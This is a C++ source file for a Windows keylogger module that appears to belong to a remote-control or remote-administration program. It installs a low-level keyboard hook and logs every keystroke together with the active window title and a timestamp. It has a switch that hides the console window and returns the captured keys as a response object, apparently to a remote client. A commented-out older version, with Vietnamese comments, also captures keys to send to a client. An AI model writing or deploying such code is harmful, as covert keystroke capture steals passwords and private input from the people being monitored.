#include "KLG_Func.h"
#include "utils.h"
#include "DataObj/DataObj.h"


// defines whether the window is visible or not
// should be solved with makefile, not in this file
#define visible // (visible / invisible)
// defines which format to use for logging
// 0 for default, 10 for dec codes, 16 for hex codex
#define FORMAT 0
// defines if ignore mouseclicks
#define mouseignore
// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
// or you will get problems since every function uses this variable.


#if FORMAT == 0

// Keyboard input map
const std::map<int, std::string> keyname{
	{VK_BACK, "[BACKSPACE]" },
	{VK_RETURN,	"\n" },
	{VK_SPACE,	"_" },
	{VK_TAB,	"[TAB]" },
	{VK_SHIFT,	"[SHIFT]" },
	{VK_LSHIFT,	"[LSHIFT]" },
	{VK_RSHIFT,	"[RSHIFT]" },
	{VK_CONTROL,	"[CONTROL]" },
	{VK_LCONTROL,	"[LCONTROL]" },
	{VK_RCONTROL,	"[RCONTROL]" },
	{VK_MENU,	"[ALT]" },
	{VK_LWIN,	"[LWIN]" },
	{VK_RWIN,	"[RWIN]" },
	{VK_ESCAPE,	"[ESCAPE]" },
	{VK_END,	"[END]" },
	{VK_HOME,	"[HOME]" },
	{VK_LEFT,	"[LEFT]" },
	{VK_RIGHT,	"[RIGHT]" },
	{VK_UP,		"[UP]" },
	{VK_DOWN,	"[DOWN]" },
	{VK_PRIOR,	"[PG_UP]" },
	{VK_NEXT,	"[PG_DOWN]" },
	{VK_OEM_PERIOD,	"." },
	{VK_DECIMAL,	"." },
	{VK_OEM_PLUS,	"+" },
	{VK_OEM_MINUS,	"-" },
	{VK_ADD,		"+" },
	{VK_SUBTRACT,	"-" },
	{VK_CAPITAL,	"[CAPSLOCK]" },
};
#endif
HHOOK _hook;

// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.
KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);
//std::ofstream output_file;
bool KLG_Func::keylogging = false;
bool released = false;
std::vector<std::string> keylog;
const std::chrono::seconds timeout(10);
auto start = std::chrono::steady_clock::now();
// This is the callback function. Consider it the event that is raised when, in this case,
// a key is pressed.
void ReleaseHook();
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	
	if (nCode >= 0)
	{
		// the action is valid: HC_ACTION.
		if (wParam == WM_KEYDOWN)
		{
			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

			// save to file
			Save(kbdStruct.vkCode);
		}
	}

	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
	// Set the hook and set it to use the callback function above
	// WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
	// function that sets and releases the hook.
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		LPCWSTR a = L"Failed to install hook!";
		LPCWSTR b = L"Error";
		MessageBox(NULL, a, b, MB_ICONERROR);
	}
}

void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}


int Save(int key_stroke)
{
	std::stringstream output;
	static char lastwindow[256] = "";
#ifndef mouseignore 
	if ((key_stroke == 1) || (key_stroke == 2))
	{
		return 0; // ignore mouse clicks
	}
#endif
	HWND foreground = GetForegroundWindow();
	DWORD threadID;
	HKL layout = NULL;

	if (foreground)
	{
		// get keyboard layout of the thread
		threadID = GetWindowThreadProcessId(foreground, NULL);
		layout = GetKeyboardLayout(threadID);
	}

	if (foreground)
	{
		char window_title[256];
		GetWindowTextA(foreground, (LPSTR)window_title, 256);

		if (strcmp(window_title, lastwindow) != 0)
		{
			strcpy_s(lastwindow, sizeof(lastwindow), window_title);

			// get time
			time_t t = time(NULL);
			struct tm tm;
			localtime_s(&tm, &t);
			char s[64];
			strftime(s, sizeof(s), "%c", &tm);

			output << "\n\n[Window: " << window_title << " - at " << s << "] ";
		}
	}

#if FORMAT == 10
	output << '[' << key_stroke << ']';
#elif FORMAT == 16
	output << std::hex << "[" << key_stroke << ']';
#else
	if (keyname.find(key_stroke) != keyname.end())
	{
		output << keyname.at(key_stroke);
	}
	else
	{
		char key;
		// check caps lock
		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		// check shift key
		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
			|| (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
		{
			lowercase = !lowercase;
		}

		// map virtual key according to keyboard layout
		key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

		// tolower converts it to lowercase properly
		if (!lowercase)
		{
			key = tolower(key);
		}
		output << char(key);
	}
#endif
	// instead of opening and closing file handlers every time, keep file open and flush.
	//output_file << output.str();
	//output_file.flush();
	keylog.push_back(output.str());

	std::cout << output.str();
	

	return 0;
}
void Stealth()
{
#ifdef visible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
#endif

#ifdef invisible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
#endif
}


std::shared_ptr<DataObj> KLG_Func::startKeylog()
{
	std::string res = "Start: ";
	std::shared_ptr<DataObj> MES(new DataObj(utils::CurrentTime(), DataType::RESPONSE, FuncType::KLG, CmdType::DATA, res));
	//const char* output_filename = "keylogger.log";
	//std::cout << "Logging output to " << output_filename << std::endl;
	//output_file.open(output_filename, std::ios_base::app);

	// visibility of window
	Stealth();

	// set the hook
	SetHook();
	keylogging = true;
	// loop to keep the console application running.
	
	MSG msg;
	
	while (GetMessage(&msg, NULL, 0, 0) && !released)
	{

		if (std::chrono::steady_clock::now() - start > timeout) break;
	}

	for (std::string key : keylog)
	{
		res += key;
	}
	res += "!";
	MES->setData(res);
	return MES;
}

std::shared_ptr<DataObj> KLG_Func::stopKeylog()
{
	std::string res = "Stop";
	std::shared_ptr<DataObj> MES(new DataObj(utils::CurrentTime(), DataType::RESPONSE, FuncType::KLG, CmdType::DATA, res));

	if (keylogging)
	{
		keylogging = false;
		ReleaseHook();
		
		res = "Keylogging stopped";
	}
	else res = "Keylogging is not running";
	MES->setData(res);
	return MES;
}



//bool KLG_Func::keylogging = false;
//HHOOK KLG_Func::hook = NULL;
//std::vector<int> keylog;
//
//LRESULT KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
//{
//	if (nCode < 0) { // Bỏ qua các thông điệp khác nếu nCode < 0
//		return CallNextHookEx(NULL, nCode, wParam, lParam);
//	}
//	
//
//	if (wParam == WM_KEYDOWN)
//	{
//		// Lấy thông tin về sự kiện phím
//		KBDLLHOOKSTRUCT* pkbhs = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
//
//		// Nếu là sự kiện nhấn phím, lưu phím vào biến tạm
//		keylog.push_back(pkbhs->vkCode);
//		std::cout << pkbhs->vkCode;
//	}
//
//	// Gọi hàm xử lý sự kiện tiếp theo trong chuỗi xử lý
//	return CallNextHookEx(NULL, nCode, wParam, lParam);
//}
///*
//std::shared_ptr<DataObj> KLG_Func::keylogger()
//{
//    std::string res = "";
//	std::shared_ptr<DataObj> MES(new DataObj(utils::CurrentTime(), DataType::RESPONSE, FuncType::KLG, CmdType::DATA, res));
//
//	// Thiết lập hook để bắt sự kiện phím
//	HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
//	// Nếu không thiết lập hook thành công, báo lỗi và thoát chương trình
//	if (!hook)
//	{
//		std::cout << "Error setting keyboard hook: " << GetLastError() << std::endl;
//		
//		// Đóng socket và giải phóng thư viện Winsock
//		// ...
//        
//		res = "Hook failed.";
//	}
//    else
//    {
//        while (!checkStopSignal())
//        {
//            // Nếu đã bắt được ít nhất một phím, gửi danh sách các phím đã bắt được đến client
//            if (!keylog.empty())
//            {
//                // Ghép các phím đã bắt được thành một chuỗi
//                for (auto key : keylog)
//                {
//                    res += (char(key));
//                }
//
//                // Xóa danh sách các phím đã bắt được
//                keylog.clear();
//            }
//
//            // Chờ 1 giây trước khi kiểm tra lại
//            Sleep(1000);
//        }
//
//        // Huỷ hook
//        UnhookWindowsHookEx(hook);
//    }
//
//    MES->setData(res);
//	
//	return MES;
//}
//*/
//void KLG_Func::KeylogThreadFunc(std::string& res)
//{
//	/*MSG msg;
//	while (GetMessage(&msg, NULL, 0, 0))
//	{
//		TranslateMessage(&msg);
//		DispatchMessage(&msg);
//		std::cout << "1";
//	}*/
//
//
//	for (int key : keylog)
//	{
//		std::cout << std::to_string(key);
//		res += std::to_string(key);
//	}
//
//	keylog.clear();
//	
//}
//
//std::shared_ptr<DataObj> KLG_Func::startKeylog()
//{
//	std::string res = "Start";
//	std::shared_ptr<DataObj> MES(new DataObj(utils::CurrentTime(), DataType::RESPONSE, FuncType::KLG, CmdType::DATA, res));
//	if (!keylogging)
//	{
//		HINSTANCE hInstance = GetModuleHandle(NULL);
//
//		// Thiết lập hook để bắt sự kiện phím
//		hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
//		// Nếu không thiết lập hook thành công, báo lỗi và thoát chương trình
//		if (!hook)
//		{
//			std::cout << "Error setting keyboard hook: " << GetLastError() << std::endl;
//
//			// Đóng socket và giải phóng thư viện Winsock
//			// ...
//
//			res = "Hook failed.";
//		}
//		else
//		{
//			keylogging = true;
//			std::thread keylogThread(KeylogThreadFunc, std::ref(res));
//			keylogThread.detach();
//		}
//	}
//	else res = "Keylogging is already running";
//	MES->setData(res);
//	return MES;
//}
//
//std::shared_ptr<DataObj> KLG_Func::stopKeylog()
//{
//	std::string res = "Stop";
//	std::shared_ptr<DataObj> MES(new DataObj(utils::CurrentTime(), DataType::RESPONSE, FuncType::KLG, CmdType::DATA, res));
//
//	if (keylogging)
//	{
//		UnhookWindowsHookEx(hook);
//		keylogging = false;
//		res = "Keylogging stopped";
//	}
//	else res = "Keylogging is not running";
//	MES->setData(res);
//	return MES;
//}


